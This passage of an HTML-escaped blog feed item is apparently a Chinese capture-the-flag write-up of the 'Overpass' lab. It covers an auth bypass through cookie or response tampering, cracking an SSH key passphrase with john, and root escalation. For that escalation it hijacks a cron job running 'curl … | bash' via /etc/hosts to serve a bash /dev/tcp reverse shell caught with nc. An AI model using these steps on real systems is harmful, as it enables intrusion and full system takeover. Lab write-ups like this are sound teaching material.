-&lt;strong&gt; 方法一:&lt;/strong&gt; 代码审计发现如果登录返回不是 Incorrect credentials 则设置 cookie&lt;br /&gt;
- 我们可以控制 bp 抓登陆的响应包将包的 Incorrect credentials 修改并且设置 302 响应 &amp;gt; 头 loaction:/admin&lt;br /&gt;
-&lt;strong&gt; 方法二:&lt;/strong&gt; 直接在控制台修改 document.cookie=&amp;quot;SessionToken&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;ssh连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh连接&#34;&gt;#&lt;/a&gt; ssh 连接&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;在 /admin 找到 ssh 私钥，将私钥保存位 rsa, 但是要找到私钥的密码可以利用 ssh2john 和 john 破解密码&lt;br /&gt;
-最后找到私钥密码 james13&lt;br /&gt;
- 直接利用 ssh 登陆&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/NctBPrVj.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
-获取 user 的 flag&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;可以看到 todo.txt 有提示在 /etc/crontab 中发现有 root 权限的脚本&lt;br /&gt;
- root curl overpass.thm/downloads/src/buildscript.sh | bash&lt;br /&gt;
- 并且 /etc/hosts 我们可以修改此时就想到我们可以 利用 root 的 cronjob 来进行一个反弹 shell&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;将 /etc/hosts 的 overpass.thm 对应的 ip 修改为本机的 ip&lt;br /&gt;
- 本机开 http 服务  python -m http.server 80&lt;br /&gt;
-&lt;strong&gt;Ps:&lt;/strong&gt;&lt;br /&gt;
- 注意本机的网站目录必须是 downloads/src/buildscript.sh&lt;br /&gt;
-&lt;a href=&#34;http://xn--buildscript-ft8qz71o.sh&#34;&gt; 并且 buildscript.sh&lt;/a&gt; 应该修改为 bash -i &amp;gt;&amp;amp; /dev/tcp/ 本机 ip / 本机端口 0&amp;gt;&amp;amp;!&lt;br /&gt;
- 最后在本机中开启 nc -lvp  本机端口开启监听等几秒就会有 root 的 shell 连接&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;overpass1 还是比较简单的主要还是要掌握一些基本的提权方法以及 web 登陆的相关机制的知识&lt;/p&gt;
 &lt;/blockquote&gt;
  ]]></description>
         </item>
